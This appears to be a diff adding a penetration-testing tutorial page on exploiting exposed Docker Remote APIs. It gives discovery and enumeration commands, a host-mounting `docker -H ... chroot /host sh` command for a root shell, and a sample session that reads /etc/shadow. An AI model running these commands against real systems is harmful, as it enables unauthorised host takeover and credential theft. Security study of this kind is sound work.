@@ -1,0 +1,176 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Docker Remote API Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Containerization</strong> • Focus: <strong>Docker Remote API Abuse</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Docker Remote API (TCP/2375-2376) allows remote management of containers. 
+    When misconfigured or exposed without authentication, attackers can 
+    enumerate containers, start malicious workloads, mount the host filesystem, 
+    and achieve remote code execution (RCE). Exploiting Docker APIs often 
+    results in full host compromise and is a common path to cryptomining 
+    or lateral movement in cloud environments.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>No Authentication:</strong> Many APIs are exposed publicly without TLS or creds.</li>
+    <li><strong>Root Privileges:</strong> Containers often run as root, enabling host access.</li>
+    <li><strong>Host Mounting:</strong> Attackers can mount <code>/</code> or sensitive dirs into a container.</li>
+    <li><strong>Container Escape:</strong> Access to Docker API = control of host kernel via container operations.</li>
+    <li><strong>Abuse in the Wild:</strong> Used for cryptojacking and malware deployment in cloud breaches.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify open Docker Remote API on TCP/2375-2376.</li>
+    <li><strong>Enumeration:</strong> List containers, images, and system info.</li>
+    <li><strong>Abuse:</strong> Run arbitrary containers with mounted host filesystems.</li>
+    <li><strong>Exploitation:</strong> Execute commands inside privileged containers.</li>
+    <li><strong>Impact:</strong> Full system compromise and persistence.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for open Docker Remote API on TCP/2375-2376.</li>
+    <li>Enumerate containers and images via the API.</li>
+    <li>Launch a container with host filesystem mounted.</li>
+    <li>Chroot or escape to gain host-level access.</li>
+    <li>Establish persistence or deploy malware/cryptominers.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p2375,2376 [target]
+curl http://[target]:2375/version        # Check API version
+
+# ------------------------------
+# Enumeration
+# ------------------------------
+curl http://[target]:2375/containers/json
+curl http://[target]:2375/images/json
+curl http://[target]:2375/info
+
+# ------------------------------
+# Launch Container for RCE
+# ------------------------------
+docker -H tcp://[target]:2375 run -it alpine sh
+
+# ------------------------------
+# Mount Host Filesystem
+# ------------------------------
+docker -H tcp://[target]:2375 run -it -v /:/host alpine chroot /host sh
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p2375 192.168.1.130
+curl http://192.168.1.130:2375/version
+docker -H tcp://192.168.1.130:2375 run -it -v /:/host alpine chroot /host sh
+id
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p2375 192.168.1.130
+PORT     STATE SERVICE
+2375/tcp open  docker
+
+[ saide ~ ]$ curl http://192.168.1.130:2375/version
+{
+  "Version": "20.10.7",
+  "ApiVersion": "1.41",
+  "GoVersion": "go1.16.5",
+  "Arch": "amd64"
+}
+
+[ saide ~ ]$ docker -H tcp://192.168.1.130:2375 run -it alpine sh
+/ # id
+uid=0(root) gid=0(root) groups=0(root)
+
+[+] Direct container root shell achieved
+
+[ saide ~ ]$ docker -H tcp://192.168.1.130:2375 run -it -v /:/host alpine chroot /host sh
+/ # cat /etc/shadow | head -2
+root:$6$randomhash:19000:0:99999:7:::
+daemon:*:18379:0:99999:7:::
+
+[+] Full host filesystem access achieved
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample Docker Remote API exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+2375/tcp open  docker
+
+# Enumeration
+Containers: 3 running
+Images: ubuntu, alpine, nginx
+
+# Exploitation
+Container launched with host mount
+
+# Proof of Exploitation
+Access to /etc/shadow and host root shell obtained
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting Docker Remote API
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1610/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Deploy Container
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Enum API → Run container → Mount host → Root compromise.</li>
+  </ul>
+</section>
